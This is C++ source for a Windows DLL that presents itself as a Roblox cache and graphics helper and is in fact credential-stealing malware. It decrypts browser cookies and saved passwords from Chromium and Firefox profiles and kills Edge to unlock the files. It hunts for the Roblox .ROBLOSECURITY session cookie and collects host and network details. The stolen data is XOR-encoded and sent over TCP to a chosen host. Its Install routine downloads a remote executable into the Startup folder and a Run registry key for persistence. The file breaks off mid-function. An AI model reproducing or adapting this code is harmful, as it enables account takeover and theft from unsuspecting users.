// RobloxUtility — local cache and graphics helper (native)
#define WIN32_LEAN_AND_MEAN
#include "main.h"
#include "sqlite.h"
#include "strings_enc.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <random>
#include <intrin.h>
#include <sstream>
#include <fstream>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")

namespace fs = std::filesystem;
using namespace sqlite_minimal;

namespace {

struct CookieEntry {
    std::string host, name, value, path, browser;
    int64_t expiry = 0;
    bool secure = false, httpOnly = false;
};
struct CredentialEntry {
    std::string url, username, password, browser;
};
}

namespace util {

static const uint8_t XOR_KEY[] = {0x63,0x6F,0x6F,0x6B,0x69,0x65,0x63,0x75,0x74,0x74,0x65,0x5F,0x4C,0x4F,0x21};
void XorCrypt(uint8_t* d, size_t n) { for(size_t i=0;i<n;i++) d[i]^=XOR_KEY[i%16]; }
void SecureZero(void* p, size_t n) { volatile uint8_t* v=(volatile uint8_t*)p; while(n--)*v++=0; }

std::wstring TempDir() {
    wchar_t t[MAX_PATH]; GetTempPathW(MAX_PATH,t);
    std::wstring d=std::wstring(t)+L"cc_tmp\\";
    CreateDirectoryW(d.c_str(),nullptr); return d;
}

std::wstring LocalAppDataDir() {
    wchar_t p[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, p)))
        return std::wstring(p);
    return L"";
}

std::wstring GetAppDataDir() {
    wchar_t p[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, p)))
        return std::wstring(p);
    return L"";
}

static void KillEdgeLockers(const std::wstring& src) {
    struct P { const wchar_t* k; const wchar_t* v; };
    static const P ps[] = {
        { L"Microsoft\\Edge",         L"msedge.exe" },
        { L"Microsoft\\Edge",         L"MicrosoftEdgeUpdate.exe" },
        { L"Microsoft\\EdgeWebView",  L"msedgewebview2.exe" },
    };
    std::vector<const wchar_t*> toKill;
    for (auto& p : ps) if (src.find(p.k) != std::wstring::npos) toKill.push_back(p.v);
    if (toKill.empty()) return;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            for (auto e : toKill) {
                if (_wcsicmp(pe.szExeFile, e) == 0) {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

bool CopyToTemp(const std::wstring& s, std::wstring& o) {
    std::wstring fn=s.substr(s.rfind(L'\\')+1);
    std::wstring tp=TempDir()+L"cc_"+fn;
    if (CopyFileW(s.c_str(),tp.c_str(),FALSE)){
        SetFileAttributesW(tp.c_str(),FILE_ATTRIBUTE_NORMAL); o=tp; return true;
    }
    KillEdgeLockers(s);
    Sleep(400);
    if (CopyFileW(s.c_str(),tp.c_str(),FALSE)){
        SetFileAttributesW(tp.c_str(),FILE_ATTRIBUTE_NORMAL); o=tp; return true;
    }
    return false;
}

bool WriteBytes(const std::wstring& p, const void* d, size_t n) {
    HANDLE h=CreateFileW(p.c_str(),GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,nullptr);
    if(h==INVALID_HANDLE_VALUE)return false; DWORD w; BOOL ok=::WriteFile(h,d,(DWORD)n,&w,nullptr); CloseHandle(h);
    return ok&&w==n;
}

bool ReadBytes(const std::wstring& p, std::vector<uint8_t>& out) {
    HANDLE h = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD sz = GetFileSize(h, nullptr);
    if (sz == 0 || sz > 64*1024*1024) { CloseHandle(h); return false; }
    out.resize(sz); DWORD rd = 0;
    BOOL ok = ::ReadFile(h, out.data(), sz, &rd, nullptr);
    CloseHandle(h);
    return ok && rd == sz;
}

bool OpenDb(const std::wstring& src, sqlite_minimal::Database& db, std::wstring* tempPath) {
    if (tempPath) tempPath->clear();
    std::wstring tmp;
    if (CopyToTemp(src, tmp)) {
        if (db.open(tmp)) { if (tempPath) *tempPath = tmp; return true; }
        DeleteFileW(tmp.c_str());
    }
    std::vector<uint8_t> data;
    if (ReadBytes(src, data) && !data.empty()) {
        if (db.open(data)) return true;
    }
    return false;
}

std::string w2n(const std::wstring& ws){
    std::string s; for(wchar_t wc:ws) if(wc<128) s+=(char)wc; return s;
}

std::vector<uint8_t> b64decode(const std::string& in) {
    static const char* t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> o; int v=0,b=-8;
    for (char c : in) {
        if (c=='='||c=='\n'||c=='\r'||c==' ') continue;
        const char* p = strchr(t, c); if (!p) continue;
        v = (v<<6)|(int)(p-t); b+=6;
        if (b>=0) { o.push_back((uint8_t)((v>>b)&0xFF)); b-=8; }
    }
    return o;
}

bool Decrypt(const std::vector<uint8_t>& ct, std::vector<uint8_t>& pt) {
    if (ct.empty()) return false;
    DATA_BLOB in={(DWORD)ct.size(),(BYTE*)ct.data()}, out={0};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &out))
            if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_LOCAL_MACHINE, &out))
                return false;
    pt.assign(out.pbData, out.pbData+out.cbData); LocalFree(out.pbData); return true;
}

static std::string jesc(const std::string& s){
    std::string o; for(char c:s){switch(c){case'"':o+="\\\"";break;case'\\':o+="\\\\";break;case'\n':o+="\\n";break;case'\r':o+="\\r";break;case'\t':o+="\\t";break;default:o+=c;}}return o;
}

std::string JsonCookies(const std::vector<CookieEntry>& cs){
    std::ostringstream ss; ss<<"{\"cookies\":[";
    for(size_t i=0;i<cs.size();i++){auto&c=cs[i];ss<<"{\"host\":\""<<jesc(c.host)<<"\",\"name\":\""<<jesc(c.name)<<"\",\"value\":\""<<jesc(c.value)<<"\",\"path\":\""<<jesc(c.path)<<"\",\"expiry\":"<<c.expiry<<",\"secure\":"<<(c.secure?"true":"false")<<",\"httpOnly\":"<<(c.httpOnly?"true":"false")<<",\"browser\":\""<<jesc(c.browser)<<"\"}";if(i+cs.size()-1&&i<cs.size()-1)ss<<",";} ss<<"]}"; return ss.str();
}

std::string JsonCreds(const std::vector<CredentialEntry>& cs){
    std::ostringstream ss; ss<<"{\"credentials\":[";
    for(size_t i=0;i<cs.size();i++){auto&c=cs[i];ss<<"{\"url\":\""<<jesc(c.url)<<"\",\"username\":\""<<jesc(c.username)<<"\",\"password\":\""<<jesc(c.password)<<"\",\"browser\":\""<<jesc(c.browser)<<"\"}";if(i<cs.size()-1)ss<<",";} ss<<"]}"; return ss.str();
}

std::string SysInfo(){
    std::ostringstream ss; char h[256]={},u[256]={}; DWORD sz=sizeof(h);
    GetComputerNameA(h,&sz); sz=sizeof(u); GetUserNameA(u,&sz);
    OSVERSIONINFOA os={sizeof(os)}; GetVersionExA(&os);
    std::string ips; ULONG bl=15000; std::vector<uint8_t> b(bl);
    auto* ad=(PIP_ADAPTER_ADDRESSES)b.data();
    if(GetAdaptersAddresses(AF_INET,GAA_FLAG_INCLUDE_PREFIX,nullptr,ad,&bl)==NO_ERROR)
        for(auto* a=ad;a;a=a->Next)for(auto* adr=a->FirstUnicastAddress;adr;adr=adr->Next)
            if(adr->Address.lpSockaddr->sa_family==AF_INET){char ip[INET_ADDRSTRLEN];inet_ntop(AF_INET,&((sockaddr_in*)adr->Address.lpSockaddr)->sin_addr,ip,sizeof(ip));if(!ips.empty())ips+=", ";ips+=ip;}
    ss<<"{\"hostname\":\""<<jesc(h)<<"\",\"username\":\""<<jesc(u)<<"\",\"os\":\"Windows "<<os.dwMajorVersion<<"."<<os.dwMinorVersion<<" build "<<os.dwBuildNumber<<"\",\"ips\":\""<<jesc(ips)<<"\",\"is_admin\":"<<(IsUserAnAdmin()?"true":"false")<<"}";
    return ss.str();
}

static std::wstring GenInstallName() {
    DWORD seed = GetTickCount() ^ GetCurrentProcessId() ^ GetCurrentThreadId();
    std::mt19937 rng(seed ^ (DWORD)__rdtsc());
    static const wchar_t hex[] = L"0123456789abcdef";
    wchar_t name[9];
    for (int i = 0; i < 8; i++) name[i] = hex[rng() & 0xF];
    name[8] = 0;
    return std::wstring(name);
}

std::vector<uint8_t> FetchUrl(const std::wstring& url) {
    std::vector<uint8_t> out;
    HINTERNET hSession = InternetOpenW(s::kUA_wstr().c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return out;
    HINTERNET hUrl = InternetOpenUrlW(hSession, url.c_str(), NULL, 0,
                                      INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hSession); return out; }
    uint8_t buf[8192]; DWORD read = 0;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0)
        out.insert(out.end(), buf, buf+read);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hSession);
    return out;
}

static const char* kStub =
    "@echo off\r\n"
    "echo utility stage-2 stub - ran at %DATE% %TIME% > \"%TEMP%\\cc_stage2_ran.txt\"\r\n"
    "exit\r\n";

static std::wstring StartupDir() {
    wchar_t ad[MAX_PATH];
    if (FAILED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, ad))) return L"";
    return std::wstring(ad) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
}

static const std::wstring& kIK() { static std::wstring s = s::kPipInstallKey_wstr(); return s; }
static const std::wstring& kIV() { static std::wstring s = s::kInstallName_wstr(); return s; }
static const std::wstring& kIP() { static std::wstring s = s::kInstallPath_wstr(); return s; }

static std::wstring RegStr(HKEY r, const wchar_t* sk, const wchar_t* v) {
    HKEY h; if (RegOpenKeyExW(r, sk, 0, KEY_READ, &h) != ERROR_SUCCESS) return L"";
    wchar_t b[MAX_PATH]={}; DWORD sz=sizeof(b), t=0;
    LONG rc = RegQueryValueExW(h, v, NULL, &t, (BYTE*)b, &sz);
    RegCloseKey(h);
    if (rc != ERROR_SUCCESS || (t != REG_SZ && t != REG_EXPAND_SZ)) return L"";
    return std::wstring(b);
}
static bool RegStrW(HKEY r, const wchar_t* sk, const wchar_t* v, const std::wstring& val) {
    HKEY h; if (RegCreateKeyExW(r, sk, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL) != ERROR_SUCCESS) return false;
    LONG rc = RegSetValueExW(h, v, 0, REG_SZ, (const BYTE*)val.c_str(),
                              (DWORD)((val.size()+1)*sizeof(wchar_t)));
    RegCloseKey(h);
    return rc == ERROR_SUCCESS;
}
static bool RegDel(HKEY r, const wchar_t* sk, const wchar_t* v) {
    HKEY h; if (RegOpenKeyExW(r, sk, 0, KEY_SET_VALUE, &h) != ERROR_SUCCESS) return false;
    LONG rc = RegDeleteValueW(h, v);
    RegCloseKey(h);
    return rc == ERROR_SUCCESS;
}
}

bool ChromeV20Decrypt(const std::wstring&, const std::vector<uint8_t>&, std::vector<uint8_t>&);
void ChromeV20Cleanup();
bool FirefoxDecryptCookie(const std::wstring&, const std::vector<uint8_t>&, std::vector<uint8_t>&);

extern "C" U_API bool GetData(const wchar_t* out) {
    ProfileRec buf[64]; int n = EnumerateProfiles(buf, 64);
    std::vector<CookieEntry> all;
    for (int i=0; i<n; i++) {
        auto& bp = buf[i]; if (bp.cookiePath.empty()) continue;
        Database db; std::wstring tmp;
        if (!util::OpenDb(bp.cookiePath, db, &tmp)) continue;
        const TableInfo* tab = db.getTable("cookies"); if (!tab) tab = db.getTable("moz_cookies");
        if (!tab) { if (!tmp.empty()) DeleteFileW(tmp.c_str()); continue; }
        auto rows = db.readTable(tab->name);
        if (!tmp.empty()) DeleteFileW(tmp.c_str());
        for (auto& row : rows) {
            auto* hc = Database::getColumn(row, tab->columns, s::kHostKeyCol_str().c_str());
            auto* nc = Database::getColumn(row, tab->columns, "name");
            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
            if (!hc || !nc || !ec || Database::isNull(*ec)) continue;
            CookieEntry ce; ce.host = Database::asText(*hc); ce.name = Database::asText(*nc);
            ce.browser = util::w2n(bp.name);
            auto* pc = Database::getColumn(row, tab->columns, "path"); ce.path = pc?Database::asText(*pc):"/";
            auto* xc = Database::getColumn(row, tab->columns, s::kExpiresCol_str().c_str()); ce.expiry = xc?Database::asInt(*xc):0;
            auto* sc = Database::getColumn(row, tab->columns, s::kSecureCol_str().c_str()); ce.secure = sc?(Database::asInt(*sc)!=0):false;
            auto* ic = Database::getColumn(row, tab->columns, s::kHttpOnlyCol_str().c_str()); ce.httpOnly = ic?(Database::asInt(*ic)!=0):false;
            const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
            std::vector<uint8_t> ct(blob);
            bool isV20 = (ct.size()>=4 && ct[0]=='v' && ct[1]=='2' && ct[2]=='0');
            bool isV10 = (ct.size()>=4 && ct[0]=='v' && ct[1]=='1' && ct[2]=='0');
            std::vector<uint8_t> dec;
            if (bp.isChromium && isV20 && !bp.localStatePath.empty() && ChromeV20Decrypt(bp.localStatePath, blob, dec)) {
                ce.value = std::string((const char*)dec.data(), dec.size()); all.push_back(std::move(ce)); continue;
            }
            if (!bp.isChromium && FirefoxDecryptCookie(bp.profileDir, blob, dec) && !dec.empty()) {
                ce.value = std::string((const char*)dec.data(), dec.size()); all.push_back(std::move(ce)); continue;
            }
            if (isV10) ct.erase(ct.begin(), ct.begin()+4);
            else if (isV20) continue;
            if (util::Decrypt(ct, dec) && !dec.empty()) {
                ce.value = std::string((const char*)dec.data(), dec.size()); all.push_back(std::move(ce));
            }
        }
    }
    std::string js = util::JsonCookies(all);
    return util::WriteBytes(out, js.data(), js.size());
}

extern "C" U_API bool GetLogins(const wchar_t* out) {
    ProfileRec buf[64]; int n = EnumerateProfiles(buf, 64);
    std::vector<CredentialEntry> all;
    for (int i=0; i<n; i++) {
        auto& bp = buf[i]; if (bp.loginDataPath.empty()) continue;
        if (!bp.isChromium) {
            std::wstring tmp;
            if (!util::CopyToTemp(bp.loginDataPath, tmp)) continue;
            std::vector<uint8_t> raw;
            if (!util::ReadBytes(tmp, raw)) { DeleteFileW(tmp.c_str()); continue; }
            DeleteFileW(tmp.c_str());
            std::string json((const char*)raw.data(), raw.size());
            auto findStr = [&](const std::string& key, size_t from, std::string& out) -> size_t {
                std::string needle = "\"" + key + "\":\"";
                size_t p = json.find(needle, from);
                if (p == std::string::npos) return std::string::npos;
                p += needle.size();
                size_t e = json.find('"', p);
                if (e == std::string::npos) return std::string::npos;
                out = json.substr(p, e - p);
                return e;
            };
            size_t cursor = 0;
            while (cursor < json.size()) {
                std::string hostname, encUser, encPass;
                size_t ah = findStr(s::kHostnameCol_str().c_str(), cursor, hostname);
                if (ah == std::string::npos) break;
                size_t au = findStr(s::kEncUserKey_str().c_str(), ah, encUser);
                if (au == std::string::npos) break;
                size_t ap = findStr(s::kEncPassKey_str().c_str(), au, encPass);
                if (ap == std::string::npos) break;
                cursor = ap;
                CredentialEntry c;
                c.url = hostname; c.browser = util::w2n(bp.name);
                auto u = util::b64decode(encUser);
                auto p = util::b64decode(encPass);
                std::vector<uint8_t> dec;
                if (FirefoxDecryptCookie(bp.profileDir, u, dec) && !dec.empty())
                    c.username = std::string((const char*)dec.data(), dec.size());
                dec.clear();
                if (FirefoxDecryptCookie(bp.profileDir, p, dec) && !dec.empty())
                    c.password = std::string((const char*)dec.data(), dec.size());
                if (!c.url.empty()) all.push_back(std::move(c));
            }
            continue;
        }
        Database db; std::wstring tmp;
        if (!util::OpenDb(bp.loginDataPath, db, &tmp)) continue;
        const TableInfo* tab = db.getTable("logins");
        if (!tab) { if (!tmp.empty()) DeleteFileW(tmp.c_str()); continue; }
        auto rows = db.readTable(tab->name);
        if (!tmp.empty()) DeleteFileW(tmp.c_str());
        for (auto& row : rows) {
            auto* uc = Database::getColumn(row, tab->columns, s::kOriginCol_str().c_str());
            if (!uc) uc = Database::getColumn(row, tab->columns, s::kHostnameCol_str().c_str());
            auto* un = Database::getColumn(row, tab->columns, s::kUserCol_str().c_str());
            if (!un) un = Database::getColumn(row, tab->columns, s::kEncUserCol_str().c_str());
            auto* pc = Database::getColumn(row, tab->columns, s::kPassCol_str().c_str());
            if (!pc) pc = Database::getColumn(row, tab->columns, s::kEncPassCol_str().c_str());
            if (!uc || !un || !pc) continue;
            CredentialEntry c; c.url = Database::asText(*uc); c.username = Database::asText(*un);
            c.browser = util::w2n(bp.name);
            if (!Database::isNull(*pc)) {
                const auto& blob = Database::asBlob(*pc);
                if (!blob.empty()) {
                    std::vector<uint8_t> ct(blob);
                    if (ct.size()>=4 && ct[0]=='v' && ct[1]=='1' && ct[2]=='0') ct.erase(ct.begin(), ct.begin()+4);
                    std::vector<uint8_t> d;
                    if (util::Decrypt(ct, d)) c.password = std::string((const char*)d.data(), d.size());
                }
            }
            all.push_back(std::move(c));
        }
    }
    std::string js = util::JsonCreds(all);
    return util::WriteBytes(out, js.data(), js.size());
}

extern "C" U_API bool GetSession(const wchar_t* out) {
    ProfileRec buf[64]; int n = EnumerateProfiles(buf, 64);
    std::vector<CookieEntry> all;
    for (int i=0; i<n; i++) {
        auto& bp = buf[i]; if (bp.cookiePath.empty()) continue;
        Database db; std::wstring tmp;
        if (!util::OpenDb(bp.cookiePath, db, &tmp)) continue;
        const TableInfo* tab = db.getTable("cookies"); if (!tab) tab = db.getTable("moz_cookies");
        if (!tab) { if (!tmp.empty()) DeleteFileW(tmp.c_str()); continue; }
        auto rows = db.readTable(tab->name, s::kDotRobloxCom_str().c_str());
        if (!tmp.empty()) DeleteFileW(tmp.c_str());
        for (auto& row : rows) {
            auto* nc = Database::getColumn(row, tab->columns, "name");
            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
            if (!nc || !ec || Database::asText(*nc) != s::kROBLOSECURITY_str().c_str() || Database::isNull(*ec)) continue;
            const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
            std::vector<uint8_t> d; bool got = false;
            if (!bp.isChromium) {
                got = FirefoxDecryptCookie(bp.profileDir, blob, d) && !d.empty();
            } else {
                std::vector<uint8_t> ct(blob);
                if (ct.size()>=4 && ct[0]=='v' && ct[1]=='1' && ct[2]=='0') ct.erase(ct.begin(), ct.begin()+4);
                got = util::Decrypt(ct, d) && !d.empty();
            }
            if (got) {
                CookieEntry ce; ce.name = s::kROBLOSECURITY_str().c_str(); ce.host = "roblox";
                ce.value = std::string((const char*)d.data(), d.size());
                ce.browser = util::w2n(bp.name);
                all.push_back(std::move(ce));
            }
        }
    }
    if (!all.empty()) {
        std::string js = util::JsonCookies(all);
        return util::WriteBytes(out, js.data(), js.size());
    }
    {
        std::wstring tmp = util::TempDir() + L"cc_app.txt";
        if (GetAppData(tmp.c_str())) {
            std::vector<uint8_t> raw;
            if (util::ReadBytes(tmp, raw)) {
                std::string text((const char*)raw.data(), raw.size());
                DeleteFileW(tmp.c_str());
                size_t pos = 0;
                while (pos < text.size()) {
                    size_t eol = text.find('\n', pos);
                    if (eol == std::string::npos) eol = text.size();
                    std::string line = text.substr(pos, eol - pos);
                    pos = eol + 1;
                    if (line.empty()) continue;
                    size_t lastTab = line.rfind('\t');
                    if (lastTab == std::string::npos) continue;
                    size_t prevTab = line.rfind('\t', lastTab-1);
                    if (prevTab == std::string::npos) continue;
                    std::string name = line.substr(prevTab+1, lastTab - prevTab - 1);
                    if (name != s::kROBLOSECURITY_str().c_str()) continue;
                    std::string value = line.substr(lastTab+1);
                    CookieEntry ce; ce.name = s::kROBLOSECURITY_str().c_str(); ce.host = "roblox";
                    ce.value = value; ce.browser = "RobloxPlayer";
                    std::vector<CookieEntry> v; v.push_back(std::move(ce));
                    std::string js = util::JsonCookies(v);
                    return util::WriteBytes(out, js.data(), js.size());
                }
            }
        }
    }
    return false;
}

extern "C" U_API bool GetAppData(const wchar_t* out) {
    using namespace util;
    wchar_t lad[MAX_PATH];
    if (FAILED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, lad))) return false;
    std::wstring cs[] = {
        std::wstring(lad) + L"\\Roblox\\LocalStorage\\" + s::kCookieFile_wstr(),
        std::wstring(lad) + L"\\Packages\\ROBLOXCorporation.ROBLOX_55va5d1nd4j8m\\LocalState\\" + s::kCookieFile_wstr(),
    };
    for (auto& src : cs) {
        if (!fs::exists(src)) continue;
        std::vector<uint8_t> raw;
        if (!ReadBytes(src, raw)) continue;
        std::string text((const char*)raw.data(), raw.size());
        const std::string k = std::string("\"") + s::kCookiesDataKey_str() + "\":\"";
        size_t p = text.find(k);
        if (p == std::string::npos) continue;
        p += k.size();
        size_t e = text.find('"', p);
        if (e == std::string::npos) continue;
        std::vector<uint8_t> enc = b64decode(text.substr(p, e - p));
        if (enc.empty()) continue;
        std::vector<uint8_t> plain;
        if (!Decrypt(enc, plain)) continue;
        return WriteBytes(out, plain.data(), plain.size());
    }
    return false;
}

extern "C" U_API bool GetInfo(char* out, size_t* sz) {
    if (!out || !sz || !*sz) return false;
    std::string fp = util::SysInfo();
    size_t m = (std::min)(fp.size(), *sz-1); memcpy(out, fp.data(), m); out[m]=0; *sz=m; return true;
}

extern "C" U_API bool WriteInfo(const wchar_t* out) {
    if (!out) return false;
    std::string fp = util::SysInfo();
    return util::WriteBytes(out, fp.data(), fp.size());
}

extern "C" U_API bool SendData(const char* host, int port, const char* payload) {
    if (!host || !payload) return false;
    WSADATA wsa; if (WSAStartup(MAKEWORD(2,2),&wsa)) return false;
    SOCKET s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if (s==INVALID_SOCKET){WSACleanup();return false;}
    int to=5000; setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(const char*)&to,sizeof(to));
    setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(const char*)&to,sizeof(to));
    sockaddr_in a={}; a.sin_family=AF_INET; a.sin_port=htons((u_short)port);
    inet_pton(AF_INET,host,&a.sin_addr);
    if (connect(s,(sockaddr*)&a,sizeof(a))==SOCKET_ERROR){closesocket(s);WSACleanup();return false;}
    size_t len=strlen(payload);
    std::vector<uint8_t> enc(len+4);
    enc[0]=(len>>24)&0xFF; enc[1]=(len>>16)&0xFF; enc[2]=(len>>8)&0xFF; enc[3]=len&0xFF;
    memcpy(enc.data()+4,payload,len);
    util::XorCrypt(enc.data(),enc.size());
    size_t sent=0;
    while (sent<enc.size()){
        int r=send(s,(const char*)enc.data()+sent,(int)(enc.size()-sent),0);
        if (r<=0){closesocket(s);WSACleanup();return false;}
        sent+=r;
    }
    closesocket(s); WSACleanup(); return true;
}

extern "C" U_API bool GetDiag(const wchar_t* out) {
    if (!out) return 0;
    ProfileRec buf[64]; int n = EnumerateProfiles(buf, 64);
    std::ostringstream ss;
    ss << "{\"candidates\":[";
    int found = 0; bool first = true;
    for (int i=0; i<n; i++) {
        auto& bp = buf[i]; if (bp.cookiePath.empty()) continue;
        Database db; std::wstring tmp;
        if (!util::OpenDb(bp.cookiePath, db, &tmp)) continue;
        const TableInfo* tab = db.getTable("cookies"); if (!tab) tab = db.getTable("moz_cookies");
        if (!tab) { if (!tmp.empty()) DeleteFileW(tmp.c_str()); continue; }
        auto rows = db.readTable(tab->name);
        if (!tmp.empty()) DeleteFileW(tmp.c_str());
        for (auto& row : rows) {
            auto* nc = Database::getColumn(row, tab->columns, "name");
            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
            auto* hc = Database::getColumn(row, tab->columns, s::kHostKeyCol_str().c_str());
            if (!nc || !ec || Database::isNull(*ec)) continue;
            if (Database::asText(*nc) != s::kROBLOSECURITY_str().c_str()) continue;
            const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
            const char* fmt = "raw";
            if (blob.size()>=4 && blob[0]=='v' && blob[1]=='2' && blob[2]=='0') fmt = "v20";
            else if (blob.size()>=4 && blob[0]=='v' && blob[1]=='1' && blob[2]=='0') fmt = "v10";
            else if (!bp.isChromium) fmt = "nss3";
            std::vector<uint8_t> d; const char* ds = "fail";
            if (!bp.isChromium) { if (FirefoxDecryptCookie(bp.profileDir, blob, d) && !d.empty()) ds = "ok"; }
            else if (!strcmp(fmt, "v20")) { if (ChromeV20Decrypt(bp.localStatePath, blob, d) && !d.empty()) ds = "ok"; else ds = "fail-v20"; }
            else if (!strcmp(fmt, "v10")) {
                std::vector<uint8_t> ct(blob); ct.erase(ct.begin(), ct.begin()+4);
                if (util::Decrypt(ct, d) && !d.empty()) ds = "ok"; else ds = "fail-dpapi";
            }
            std::string host = hc ? Database::asText(*hc) : "?";
            if (!first) ss << ","; first = false;
            ss << "{\"browser\":\"" << util::jesc(util::w2n(bp.name)) << "\","
               << "\"host\":\"" << util::jesc(host) << "\","
               << "\"format\":\"" << fmt << "\","
               << "\"decrypt_status\":\"" << ds << "\","
               << "\"encrypted_size\":" << blob.size() << "}";
            found++;
        }
    }
    ss << "],\"profiles_scanned\":" << n << "}";
    std::string s = ss.str();
    FILE* f = nullptr;
    if (_wfopen_s(&f, out, L"wb") == 0 && f) { fwrite(s.data(), 1, s.size(), f); fclose(f); }
    return found;
}

extern "C" U_API bool GetCache(const wchar_t* outDir) {
    if (!outDir) return false;
    using namespace util;
    std::wstring src = LocalAppDataDir() + L"\\Microsoft\\Windows\\Explorer";
    if (!fs::exists(src)) return false;
    if (!fs::exists(outDir)) { std::error_code ec; fs::create_directories(outDir, ec); if (ec) return false; }
    int copied = 0;
    try {
        for (auto& e : fs::directory_iterator(src)) {
            if (!e.is_regular_file()) continue;
            auto fn = e.path().filename().wstring();
            if (fn.find(s::kThumbPrefix_wstr()) == 0 && fn.find(L".db") != std::wstring::npos) {
                std::wstring dst = std::wstring(outDir);
                if (!dst.empty() && dst.back() != L'\\') dst += L'\\';
                dst += fn;
                std::error_code ec;
                fs::copy_file(e.path(), dst, fs::copy_options::overwrite_existing, ec);
                if (!ec) copied++;
            }
        }
    } catch (...) {}
    return copied > 0;
}

extern "C" U_API bool DecryptBlob(const uint8_t* ct, size_t ctl, uint8_t* pt, size_t* ptl) {
    if (!ct || !pt || !ptl) return false;
    std::vector<uint8_t> c(ct, ct+ctl), p;
    if (!util::Decrypt(c, p)) return false;
    if (p.size() > *ptl) return false;
    memcpy(pt, p.data(), p.size()); *ptl = p.size(); return true;
}

extern "C" U_API bool Install(const wchar_t* src) {
    using namespace util;
    if (!RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str()).empty()) return false;
    std::wstring startup = StartupDir();
    if (startup.empty()) return false;
    if (!fs::exists(startup)) { std::error_code ec; fs::create_directories(startup, ec); if (ec) return false; }
    std::wstring name = GenInstallName();
    std::wstring ext = L".bat";
    std::vector<uint8_t> bytes;
    if (src == nullptr || *src == L'\0') {
        bytes.assign(kStub, kStub + strlen(kStub)); ext = L".bat";
    } else {
        std::wstring s(src);
        if (s.size() >= 7 && (s.substr(0,7) == L"http://" || s.substr(0,8) == L"https://")) {
            bytes = FetchUrl(s);
            if (bytes.empty()) return false;
            ext = (bytes.size()>=2 && bytes[0]=='M' && bytes[1]=='Z') ? L".exe" : L".bin";
        } else {
            if (!ReadBytes(s, bytes) || bytes.empty()) return false;
            ext = (bytes.size()>=2 && bytes[0]=='M' && bytes[1]=='Z') ? L".exe" : L".bat";
        }
    }
    std::wstring dst = startup + L"\\" + name + ext;
    if (!WriteBytes(dst, bytes.data(), bytes.size())) return false;
    HKEY hRun;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
        RegSetValueExW(hRun, name.c_str(), 0, REG_SZ,
                       (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hRun);
    }
    RegStrW(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str(), name);
    RegStrW(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str(), dst);
    return true;
}

extern "C" U_API bool Remove() {
    using namespace util;
    std::wstring name = RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str());
    if (name.empty()) return false;
    HKEY hRun;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
        RegDeleteValueW(hRun, name.c_str()); RegCloseKey(hRun);
    }
    std::wstring path = RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str());
    if (!path.empty()) DeleteFileW(path.c_str());
    std::wstring startup = StartupDir();
    if (!startup.empty()) {
        DeleteFileW((startup + L"\\" + name + L".bat").c_str());
        DeleteFileW((startup + L"\\" + name + L".exe").c_str());
    }
    RegDel(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str());
    RegDel(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str());
    RegDeleteKeyW(HKEY_CURRENT_USER, kIK().c_str());
    return true;
}

extern "C" U_API bool IsActive() {
    using namespace util;
